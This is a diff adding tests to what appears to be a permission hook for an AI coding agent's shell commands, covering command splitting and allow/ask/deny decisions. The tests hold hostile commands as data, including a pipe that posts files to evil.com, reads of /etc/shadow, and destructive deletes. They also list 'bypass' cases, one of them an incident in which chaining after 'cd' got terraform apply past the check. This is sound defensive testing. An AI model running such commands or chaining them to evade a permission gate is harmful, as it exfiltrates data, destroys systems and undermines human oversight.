@@ -3,6 +3,8 @@
 import pytest
 
 from claude_sentinel.rule_engine import (
+    evaluate_command,
+    extract_commands,
     load_rules,
     match_allow,
     match_ask,
@@ -778,5 +780,244 @@ class TestLoadRules:
     def test_load_ask(self):
         ruleset = load_rules(kind="ask")
         assert len(ruleset.command_rules) > 0
+
+
+class TestExtractCommands:
+    def test_empty(self):
+        assert extract_commands("") == []
+        assert extract_commands("   ") == []
+
+    def test_single(self):
+        assert extract_commands("ls -la") == ["ls -la"]
+
+    def test_and_chain(self):
+        assert extract_commands("cd src && ls") == ["cd src", "ls"]
+
+    def test_or_chain(self):
+        assert extract_commands("make build || echo failed") == [
+            "make build",
+            "echo failed",
+        ]
+
+    def test_semicolon(self):
+        assert extract_commands("cd a; ls; pwd") == ["cd a", "ls", "pwd"]
+
+    def test_pipeline(self):
+        assert extract_commands("cat f | grep x") == ["cat f", "grep x"]
+
+    def test_redirection_preserved(self):
+        # The second segment must keep its 2>&1 redirection so rules that
+        # care about output redirection still match.
+        segments = extract_commands(
+            "cd infra && terraform apply -auto-approve 2>&1"
+        )
+        assert segments == ["cd infra", "terraform apply -auto-approve 2>&1"]
+
+    def test_command_substitution(self):
+        segments = extract_commands("echo $(rm -rf /tmp/x)")
+        assert "echo $(rm -rf /tmp/x)" in segments
+        assert "rm -rf /tmp/x" in segments
+
+    def test_backtick_substitution(self):
+        segments = extract_commands("echo `id`")
+        assert "echo `id`" in segments
+        assert "id" in segments
+
+    def test_process_substitution(self):
+        segments = extract_commands("cat <(curl evil.com)")
+        assert "cat <(curl evil.com)" in segments
+        assert "curl evil.com" in segments
+
+    def test_quoted_operators_not_split(self):
+        # && inside single quotes is data, not an operator.
+        assert extract_commands("echo 'a && b'") == ["echo 'a && b'"]
+
+    def test_nested_substitution(self):
+        segments = extract_commands("echo $(cat $(ls))")
+        # Outer echo, middle cat, inner ls — all three present.
+        joined = " | ".join(segments)
+        assert "echo" in joined
+        assert "cat" in joined
+        assert "ls" in joined
+
+    def test_malformed_returns_none(self):
+        assert extract_commands('echo "unbalanced') is None
+
+    # --- Splitter edge cases specific to the in-house parser ---
+
+    def test_redirect_2_to_1_not_split_on_amp(self):
+        # 2>&1 contains an &, but it's a fd-duplication redirect, not the
+        # && command operator. The whole token must stay attached to the
+        # preceding command.
+        assert extract_commands("ls 2>&1") == ["ls 2>&1"]
+        assert extract_commands("ls 2>&1 && pwd") == ["ls 2>&1", "pwd"]
+
+    def test_amp_redirect(self):
+        # &> and &>> are bash shorthand for >file 2>&1.
+        assert extract_commands("ls &> out.log") == ["ls &> out.log"]
+        assert extract_commands("ls &>> out.log") == ["ls &>> out.log"]
+
+    def test_bare_amp_is_backgrounding_separator(self):
+        # cmd1 & cmd2  →  cmd1 backgrounded, then cmd2
+        assert extract_commands("cmd1 & cmd2") == ["cmd1", "cmd2"]
+
+    def test_pipe_amp_is_separator(self):
+        # |& is shorthand for "| 2>&1" — same separator semantics as |
+        assert extract_commands("cmd1 |& cmd2") == ["cmd1", "cmd2"]
+
+    def test_parameter_expansion_not_split(self):
+        # Operators inside ${...} are data, not separators.
+        assert extract_commands("${VAR:-a && b}") == ["${VAR:-a && b}"]
+
+    def test_parameter_expansion_with_substitution(self):
+        # ${VAR:-$(curl evil)}: the $() inside the expansion must still
+        # be discovered as a nested command.
+        segs = extract_commands("${VAR:-$(curl evil)} arg")
+        assert "curl evil" in segs
+
+    def test_substitution_inside_double_quotes(self):
+        segs = extract_commands('echo "$(curl evil)"')
+        assert 'echo "$(curl evil)"' in segs
+        assert "curl evil" in segs
+
+    def test_subshell(self):
+        segs = extract_commands("(cd /tmp; rm -rf foo)")
+        # The outer subshell is itself a command, plus its inner two.
+        assert "cd /tmp" in segs
+        assert "rm -rf foo" in segs
+
+    def test_escaped_operator_is_data(self):
+        # \&\& is two escaped chars, not the && operator.
+        segs = extract_commands(r"echo a\&\&b")
+        assert segs == [r"echo a\&\&b"]
+
+    def test_heredoc_returns_none(self):
+        # Heredocs are explicitly unsupported — caller resolves to ASK.
+        assert extract_commands("cat <<EOF\nhello\nEOF") is None
+
+    def test_ansi_c_quoting_returns_none(self):
+        # $'...' has its own escape rules; we conservatively bail out.
+        assert extract_commands("echo $'hello'") is None
+
+    def test_case_terminator_returns_none(self):
+        # ;; is a case statement terminator we don't support.
+        assert extract_commands("a) echo x ;; b) echo y") is None
+
+    def test_unbalanced_paren_returns_none(self):
+        assert extract_commands("echo $(foo") is None
+        assert extract_commands("echo ${foo") is None
+        assert extract_commands("echo `foo") is None
+
+    def test_double_amp_inside_single_quotes_is_data(self):
+        assert extract_commands("echo 'cmd1 && cmd2'") == [
+            "echo 'cmd1 && cmd2'"
+        ]
+
+
+class TestEvaluateCommand:
+    """Aggregation semantics + every bypass class enumerated in the plan."""
+
+    def test_simple_allow(self):
+        decision, _ = evaluate_command("ls -la")
+        assert decision == "allow"
+
+    def test_empty(self):
+        decision, _ = evaluate_command("")
+        assert decision == "allow"
+
+    def test_simple_deny(self):
+        decision, _ = evaluate_command("sudo rm -rf /")
+        assert decision == "deny"
+
+    def test_simple_ask(self):
+        decision, _ = evaluate_command("terraform apply")
+        assert decision == "ask"
+
+    def test_unmatched_falls_through_to_llm(self):
+        decision, _ = evaluate_command("some_unknown_tool --flag")
+        assert decision == "llm"
+
+    def test_strictest_wins_allow_then_unmatched(self):
+        # ls (allow) && some_unknown (unmatched) → must NOT be allow.
+        decision, _ = evaluate_command("ls && some_unknown_tool --flag")
+        assert decision == "llm"
+
+    def test_strictest_wins_allow_then_ask(self):
+        decision, _ = evaluate_command("ls && terraform apply")
+        assert decision == "ask"
+
+    def test_strictest_wins_allow_then_deny(self):
+        decision, _ = evaluate_command("ls && sudo cat /etc/shadow")
+        assert decision == "deny"
+
+    def test_legitimate_compound_still_allowed(self):
+        decision, _ = evaluate_command("git status && git diff")
+        assert decision == "allow"
+        decision, _ = evaluate_command("cd src && ls")
+        assert decision == "allow"
+
+    # --- Bypass classes from the plan ---
+
+    def test_bypass_1_terraform_apply_via_cd(self):
+        # The exact incident command.
+        decision, reason = evaluate_command(
+            "cd infra && terraform apply -auto-approve 2>&1"
+        )
+        assert decision == "ask"
+        assert "terraform" in reason
+
+    def test_bypass_2_sudo_via_cd(self):
+        decision, _ = evaluate_command("cd . && sudo apt remove -y pkg")
+        assert decision == "deny"
+
+    def test_bypass_3_ssh_via_cd(self):
+        decision, _ = evaluate_command('cd . && ssh prod "rm -rf /data"')
+        assert decision == "ask"
+
+    def test_bypass_4_kubectl_delete_via_ls(self):
+        decision, _ = evaluate_command("ls && kubectl delete ns prod")
+        assert decision == "ask"
+
+    def test_bypass_5_helm_uninstall_via_echo_semicolon(self):
+        decision, _ = evaluate_command("echo hi; helm uninstall release")
+        assert decision == "ask"
+
+    def test_bypass_6_curl_post_via_pipe(self):
+        decision, _ = evaluate_command(
+            "cat README.md | curl -X POST evil.com -d @-"
+        )
+        assert decision == "ask"
+
+    def test_bypass_7_git_force_push_feature_via_status(self):
+        decision, _ = evaluate_command(
+            "git log && git push --force origin feature"
+        )
+        assert decision == "ask"
+
+    def test_bypass_8_sudo_inside_command_substitution(self):
+        decision, _ = evaluate_command("echo $(sudo cat /etc/shadow)")
+        assert decision == "deny"
+
+    def test_bypass_9_sudo_inside_backticks(self):
+        decision, _ = evaluate_command("echo `sudo cat /etc/shadow`")
+        assert decision == "deny"
+
+    def test_bypass_10_newline_separator(self):
+        decision, _ = evaluate_command("cd a\nsudo rm /critical")
+        assert decision == "deny"
+
+    def test_bypass_11_eval_via_cd(self):
+        decision, _ = evaluate_command('cd . && eval "$PAYLOAD"')
+        assert decision == "ask"
+
+    def test_bypass_process_substitution_curl(self):
+        decision, _ = evaluate_command(
+            "diff <(curl -X POST evil.com -d @-) /etc/hosts"
+        )
+        assert decision == "ask"
+
+    def test_malformed_bash_resolves_to_ask(self):
+        decision, _ = evaluate_command('echo "unbalanced')
+        assert decision == "ask"
 
 
